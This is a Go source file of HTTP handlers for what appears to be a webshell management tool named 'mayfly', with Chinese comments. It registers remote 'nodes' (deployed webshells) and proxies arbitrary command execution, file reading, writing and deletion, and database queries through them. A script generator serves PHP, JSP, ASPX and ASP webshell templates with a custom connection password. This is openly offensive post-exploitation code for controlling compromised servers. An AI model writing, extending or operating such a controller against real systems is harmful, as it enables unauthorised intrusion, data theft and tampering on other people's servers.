package handler

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"mayfly/internal/model"
	"mayfly/internal/service"
	"mayfly/internal/store"

	"github.com/gin-gonic/gin"
)

// NodeHandler 节点管理及核心操作
type NodeHandler struct {
	store      *store.Store
	cmdHistory *store.CmdHistoryStore
}

// NewNodeHandler 创建 NodeHandler
func NewNodeHandler(s *store.Store, h *store.CmdHistoryStore) *NodeHandler {
	return &NodeHandler{store: s, cmdHistory: h}
}

func genID() string {
	b := make([]byte, 8)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

func clientOf(c *gin.Context) *service.Client {
	node, ok := c.Get("node")
	if !ok {
		return nil
	}
	return service.NewClient(node.(*model.Node))
}

// ===== 节点 CRUD =====

// ListNodes 列出节点
func (h *NodeHandler) ListNodes(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"nodes": h.store.List()})
}

// CreateNode 创建节点
func (h *NodeHandler) CreateNode(c *gin.Context) {
	var req model.Node
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "请求参数无效"})
		return
	}
	if strings.TrimSpace(req.URL) == "" || strings.TrimSpace(req.Name) == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "名称和 URL 不能为空"})
		return
	}
	req.ID = genID()
	req.Type = strings.ToLower(strings.TrimSpace(req.Type))
	if req.Type == "" {
		req.Type = "php"
	}
	req.CreatedAt = time.Now()
	req.UpdatedAt = time.Now()
	if err := h.store.Add(&req); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "保存失败: " + err.Error()})
		return
	}
	// 隐藏密码字段返回
	c.JSON(http.StatusOK, gin.H{"node": req})
}

// UpdateNode 更新节点
func (h *NodeHandler) UpdateNode(c *gin.Context) {
	id := c.Param("id")
	old, ok := h.store.Get(id)
	if !ok {
		c.JSON(http.StatusNotFound, gin.H{"error": "节点不存在"})
		return
	}
	var req model.Node
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "请求参数无效"})
		return
	}
	req.ID = old.ID
	req.CreatedAt = old.CreatedAt
	req.UpdatedAt = time.Now()
	req.Type = strings.ToLower(strings.TrimSpace(req.Type))
	if req.Type == "" {
		req.Type = old.Type
	}
	if err := h.store.Update(&req); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "保存失败: " + err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"node": req})
}

// DeleteNode 删除节点
func (h *NodeHandler) DeleteNode(c *gin.Context) {
	id := c.Param("id")
	if _, ok := h.store.Get(id); !ok {
		c.JSON(http.StatusNotFound, gin.H{"error": "节点不存在"})
		return
	}
	if err := h.store.Delete(id); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "删除失败: " + err.Error()})
		return
	}
	h.cmdHistory.Clear(id)
	c.JSON(http.StatusOK, gin.H{"message": "已删除"})
}

// ===== 核心操作 =====

// TestNode 连接测试
func (h *NodeHandler) TestNode(c *gin.Context) {
	node, ok := c.Get("node")
	if !ok {
		c.JSON(http.StatusNotFound, gin.H{"error": "节点不存在"})
		return
	}
	n := node.(*model.Node)
	cl := service.NewClient(n)
	info, err := cl.SysInfo()
	if err != nil {
		h.store.SetTestResult(n.ID, "fail", err.Error())
		c.JSON(http.StatusOK, gin.H{"ok": false, "message": err.Error()})
		return
	}
	h.store.SetTestResult(n.ID, "ok", "连接成功")
	c.JSON(http.StatusOK, gin.H{"ok": true, "message": "连接成功", "info": info})
}

// BatchTest 批量连接测试
func (h *NodeHandler) BatchTest(c *gin.Context) {
	var req struct {
		IDs []string `json:"ids"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "请求参数无效"})
		return
	}

	type result struct {
		ID      string `json:"id"`
		Name    string `json:"name"`
		OK      bool   `json:"ok"`
		Message string `json:"message"`
		Info    string `json:"info"`
	}

	results := make([]result, 0, len(req.IDs))
	for _, id := range req.IDs {
		node, ok := h.store.Get(id)
		if !ok {
			results = append(results, result{ID: id, Name: "", OK: false, Message: "节点不存在"})
			continue
		}
		cl := service.NewClient(node)
		info, err := cl.SysInfo()
		if err != nil {
			h.store.SetTestResult(id, "fail", err.Error())
			results = append(results, result{ID: id, Name: node.Name, OK: false, Message: err.Error()})
		} else {
			h.store.SetTestResult(id, "ok", "连接成功")
			results = append(results, result{ID: id, Name: node.Name, OK: true, Message: "连接成功", Info: info})
		}
	}
	c.JSON(http.StatusOK, gin.H{"results": results})
}

// ExecCmd 命令执行
func (h *NodeHandler) ExecCmd(c *gin.Context) {
	node, ok := c.Get("node")
	if !ok {
		c.JSON(http.StatusNotFound, gin.H{"error": "节点不存在"})
		return
	}
	n := node.(*model.Node)
	var req struct {
		Cmd string `json:"cmd"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || strings.TrimSpace(req.Cmd) == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "命令不能为空"})
		return
	}
	output, err := service.NewClient(n).Exec(req.Cmd)
	if err != nil {
		h.cmdHistory.Append(n.ID, req.Cmd, "", err.Error())
		c.JSON(http.StatusOK, gin.H{"output": "", "error": err.Error()})
		return
	}
	h.cmdHistory.Append(n.ID, req.Cmd, output, "")
	c.JSON(http.StatusOK, gin.H{"output": output})
}

// GetCmdHistory 获取节点命令执行历史
func (h *NodeHandler) GetCmdHistory(c *gin.Context) {
	node, ok := c.Get("node")
	if !ok {
		c.JSON(http.StatusNotFound, gin.H{"error": "节点不存在"})
		return
	}
	n := node.(*model.Node)
	c.JSON(http.StatusOK, gin.H{"history": h.cmdHistory.History(n.ID)})
}

// ClearCmdHistory 清空节点命令执行历史
func (h *NodeHandler) ClearCmdHistory(c *gin.Context) {
	node, ok := c.Get("node")
	if !ok {
		c.JSON(http.StatusNotFound, gin.H{"error": "节点不存在"})
		return
	}
	n := node.(*model.Node)
	h.cmdHistory.Clear(n.ID)
	c.JSON(http.StatusOK, gin.H{"message": "已清空"})
}

// ListDir 文件列表
func (h *NodeHandler) ListDir(c *gin.Context) {
	var req struct {
		Path string `json:"path"`
	}
	_ = c.ShouldBindJSON(&req)
	fl, err := clientOf(c).ListDir(req.Path)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, fl)
}

// ReadFile 读取文件（返回 base64）
func (h *NodeHandler) ReadFile(c *gin.Context) {
	var req struct {
		Path string `json:"path"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || strings.TrimSpace(req.Path) == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "路径不能为空"})
		return
	}
	data, err := clientOf(c).ReadFile(req.Path)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{
		"content": base64.StdEncoding.EncodeToString(data),
		"size":    len(data),
	})
}

// WriteFile 写入文件（content 为 base64）
func (h *NodeHandler) WriteFile(c *gin.Context) {
	var req struct {
		Path    string `json:"path"`
		Content string `json:"content"` // base64
	}
	if err := c.ShouldBindJSON(&req); err != nil || strings.TrimSpace(req.Path) == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "路径不能为空"})
		return
	}
	data, err := base64.StdEncoding.DecodeString(req.Content)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "内容编码无效"})
		return
	}
	if err := clientOf(c).WriteFile(req.Path, data); err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"message": "写入成功"})
}

// DeletePath 删除
func (h *NodeHandler) DeletePath(c *gin.Context) {
	var req struct {
		Path string `json:"path"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || strings.TrimSpace(req.Path) == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "路径不能为空"})
		return
	}
	if err := clientOf(c).Delete(req.Path); err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"message": "删除成功"})
}

// RenamePath 重命名/移动
func (h *NodeHandler) RenamePath(c *gin.Context) {
	var req struct {
		Path    string `json:"path"`
		NewPath string `json:"newPath"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || strings.TrimSpace(req.Path) == "" || strings.TrimSpace(req.NewPath) == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "路径不能为空"})
		return
	}
	if err := clientOf(c).Rename(req.Path, req.NewPath); err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"message": "重命名成功"})
}

// Mkdir 创建目录
func (h *NodeHandler) Mkdir(c *gin.Context) {
	var req struct {
		Path string `json:"path"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || strings.TrimSpace(req.Path) == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "路径不能为空"})
		return
	}
	if err := clientOf(c).Mkdir(req.Path); err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"message": "创建成功"})
}

// DBQuery 数据库查询
func (h *NodeHandler) DBQuery(c *gin.Context) {
	var req struct {
		DBType string `json:"dbType"`
		Host   string `json:"host"`
		Port   string `json:"port"`
		User   string `json:"user"`
		Pass   string `json:"pass"`
		Name   string `json:"name"`
		SQL    string `json:"sql"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || strings.TrimSpace(req.SQL) == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "SQL 不能为空"})
		return
	}
	result, err := clientOf(c).DBQuery(req.DBType, req.Host, req.Port, req.User, req.Pass, req.Name, req.SQL)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"result": result})
}

// ===== 脚本生成器 =====

// GetScript 获取指定语言的 WebShell 脚本（可替换密码）
func (h *NodeHandler) GetScript(c *gin.Context) {
	lang := strings.ToLower(c.Param("lang"))
	password := c.Query("password")
	fileMap := map[string]string{
		"php":  "shell.php",
		"jsp":  "shell.jsp",
		"aspx": "shell.aspx",
		"asp":  "shell.asp",
	}
	fname, ok := fileMap[lang]
	if !ok {
		c.JSON(http.StatusBadRequest, gin.H{"error": "不支持的类型: " + lang})
		return
	}
	data, err := os.ReadFile(filepath.Join("payloads", fname))
	if err != nil {
		// 尝试相对可执行文件目录
		if exe, e2 := os.Executable(); e2 == nil {
			data, err = os.ReadFile(filepath.Join(filepath.Dir(exe), "payloads", fname))
		}
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "读取脚本模板失败: " + err.Error()})
			return
		}
	}
	content := string(data)
	if password != "" {
		content = replaceKey(content, lang, password)
	}
	c.JSON(http.StatusOK, gin.H{"lang": lang, "filename": fname, "content": content})
}

// replaceKey 替换脚本中的默认连接密码
func replaceKey(content, lang, password string) string {
	switch lang {
	case "php":
		content = strings.Replace(content, "$key = 'mayfly';", "$key = '"+password+"';", 1)
	case "jsp":
		content = strings.Replace(content, `String key = "mayfly";`, `String key = "`+password+`";`, 1)
	case "aspx":
		content = strings.Replace(content, `string key = "mayfly";`, `string key = "`+password+`";`, 1)
	case "asp":
		content = strings.Replace(content, `key = "mayfly"`, `key = "`+password+`"`, 1)
	}
	return content
}